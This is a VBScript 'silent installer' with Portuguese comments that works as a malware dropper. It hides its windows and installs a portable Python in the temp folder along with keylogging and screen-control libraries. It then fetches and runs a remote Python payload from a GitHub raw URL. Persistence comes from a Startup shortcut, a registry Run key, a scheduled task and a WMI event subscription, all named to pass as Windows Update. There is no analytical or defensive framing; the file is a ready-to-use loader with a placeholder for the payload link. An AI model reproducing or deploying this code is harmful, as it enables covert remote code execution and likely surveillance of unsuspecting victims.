' ===== INSTALADOR SILENCIOSO v2.0 =====
' Modo completamente oculto

Dim shell, fso, http, pythonPath, scriptPath, tempFolder, startupFolder
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' Configurações (EDITAR AQUI)
GITHUB_RAW_URL = "https://raw.githubusercontent.com/Jukanero/svchost/refs/heads/main/app2.py"  ' <- COLOQUE SEU LINK AQUI

' Pastas
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
startupFolder = shell.SpecialFolders("Startup")
pythonPath = tempFolder & "\python.exe"
scriptPath = tempFolder & "\system_worker.py"

' Função para executar comando silenciosamente
Function RunSilent(cmd)
    shell.Run "cmd /c " & cmd & " >nul 2>&1", 0, True
End Function

' Função para baixar arquivo
Function DownloadFile(url, destino)
    On Error Resume Next
    http.open "GET", url, False
    http.send
    
    If http.status = 200 Then
        Dim stream
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.Write http.responseBody
        stream.SaveToFile destino, 2
        stream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If
    On Error GoTo 0
End Function

' PASSO 1: Verificar se Python já está instalado
Function IsPythonInstalled()
    Dim result
    result = shell.Run("python --version >nul 2>&1", 0, True)
    If result = 0 Then
        IsPythonInstalled = True
    Else
        ' Tenta caminho comum
        If fso.FileExists("C:\Python39\python.exe") Then
            pythonPath = "C:\Python39\python.exe"
            IsPythonInstalled = True
        ElseIf fso.FileExists("C:\Python38\python.exe") Then
            pythonPath = "C:\Python38\python.exe"
            IsPythonInstalled = True
        Else
            IsPythonInstalled = False
        End If
    End If
End Function

' PASSO 2: Instalar Python se necessário
If Not IsPythonInstalled() Then
    ' Baixa get-pip.py
    DownloadFile "https://bootstrap.pypa.io/get-pip.py", tempFolder & "\get-pip.py"
    
    ' Baixa Python embeddable (versão portátil, não precisa instalar)
    DownloadFile "https://www.python.org/ftp/python/3.9.0/python-3.9.0-embed-amd64.zip", tempFolder & "\python.zip"
    
    ' Extrai
    Set objShell = CreateObject("Shell.Application")
    Set filesInZip = objShell.NameSpace(tempFolder & "\python.zip").Items
    objShell.NameSpace(tempFolder).CopyHere(filesInZip), &H100
    
    ' Renomeia python.exe
    If fso.FileExists(tempFolder & "\python.exe") Then
        ' Já existe
    ElseIf fso.FileExists(tempFolder & "\python39._pth") Then
        ' Renomeia arquivo ._pth para permitir site-packages
        Dim pthFile
        Set pthFile = fso.OpenTextFile(tempFolder & "\python39._pth", 1)
        Dim content
        content = pthFile.ReadAll
        pthFile.Close
        
        ' Remove comentário da linha import site
        content = Replace(content, "#import site", "import site")
        
        Set pthFile = fso.OpenTextFile(tempFolder & "\python39._pth", 2)
        pthFile.Write content
        pthFile.Close
        
        ' Renomeia .exe
        fso.MoveFile tempFolder & "\python39._pth", tempFolder & "\python._pth"
    End If
    
    ' Cria pasta site-packages
    fso.CreateFolder tempFolder & "\site-packages"
    
    ' Cria arquivo .pth para adicionar site-packages ao path
    Dim pthContent
    pthContent = "import site; site.addsitedir(r'" & tempFolder & "\site-packages')"
    Set pthFile = fso.OpenTextFile(tempFolder & "\usercustomize.py", 2, True)
    pthFile.Write pthContent
    pthFile.Close
    
    ' Define variável de ambiente para usar usercustomize.py
    shell.Environment("PROCESS")("PYTHONPATH") = tempFolder
    
    ' Instala pip
    shell.Run """" & tempFolder & "\python.exe"" """ & tempFolder & "\get-pip.py"" --no-warn-script-location --target=""" & tempFolder & "\site-packages""", 0, True
    
    pythonPath = tempFolder & "\python.exe"
End If

' PASSO 3: Instalar dependências
RunSilent """" & pythonPath & """ -m pip install --quiet --target=""" & tempFolder & "\site-packages""" & " requests Pillow numpy opencv-python pyautogui keyboard mouse psutil pywin32"

' PASSO 4: Baixar script principal
DownloadFile GITHUB_RAW_URL, scriptPath

' PASSO 5: Configurar persistência (múltiplos métodos)

' Método 1: Atalho na pasta Startup
Dim shortcutPath
shortcutPath = startupFolder & "\WindowsUpdate.lnk"
Dim shortcut
Set shortcut = shell.CreateShortcut(shortcutPath)
shortcut.TargetPath = pythonPath
shortcut.Arguments = """" & scriptPath & """ --quiet"
shortcut.WindowStyle = 7  ' Minimized
shortcut.Save

' Método 2: Registry Run
shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateService", """" & pythonPath & """ """ & scriptPath & """ --quiet", "REG_SZ"

' Método 3: Tarefa agendada (tenta com privilégios)
On Error Resume Next
shell.Run "schtasks /create /tn ""WindowsUpdateTask"" /tr """"" & pythonPath & """ """ & scriptPath & """ --quiet"" /sc onlogon /f", 0, True
On Error GoTo 0

' Método 4: WMI Event Subscription (persistência avançada)
Dim wmiCode
wmiCode = "strComputer = "".""" & vbCrLf & _
          "Set objWMIService = GetObject(""winmgmts:{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\subscription"")" & vbCrLf & _
          "Set objFilter = objWMIService.Get(""__EventFilter"").SpawnInstance_()" & vbCrLf & _
          "objFilter.Name = ""SystemMonitor""" & vbCrLf & _
          "objFilter.EventNamespace = 'root\cimv2'" & vbCrLf & _
          "objFilter.QueryLanguage = 'WQL'" & vbCrLf & _
          "objFilter.Query = ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""" & vbCrLf & _
          "objFilter.Put_" & vbCrLf & _
          "Set objConsumer = objWMIService.Get(""ActiveScriptEventConsumer"").SpawnInstance_()" & vbCrLf & _
          "objConsumer.Name = ""SystemMonitorScript""" & vbCrLf & _
          "objConsumer.ScriptingEngine = 'VBScript'" & vbCrLf & _
          "objConsumer.ScriptText = ""CreateObject(""WScript.Shell"").Run """"""" & pythonPath & """ """ & scriptPath & """ --quiet"""""", 0""" & vbCrLf & _
          "objConsumer.Put_" & vbCrLf & _
          "Set objBinding = objWMIService.Get(""__FilterToConsumerBinding"").SpawnInstance_()" & vbCrLf & _
          "objBinding.Filter = objFilter.Path_" & vbCrLf & _
          "objBinding.Consumer = objConsumer.Path_" & vbCrLf & _
          "objBinding.Put_"

Dim wmiFile
wmiFile = tempFolder & "\wmi_install.vbs"
Set wmiScript = fso.OpenTextFile(wmiFile, 2, True)
wmiScript.Write wmiCode
wmiScript.Close

shell.Run "cscript """ & wmiFile & """ //Nologo", 0, True

' PASSO 6: Executar agora
shell.Run """" & pythonPath & """ """ & scriptPath & """ --quiet", 0, False

' PASSO 7: Auto-destruição do instalador (opcional)
' fso.DeleteFile WScript.ScriptFullName

' Fim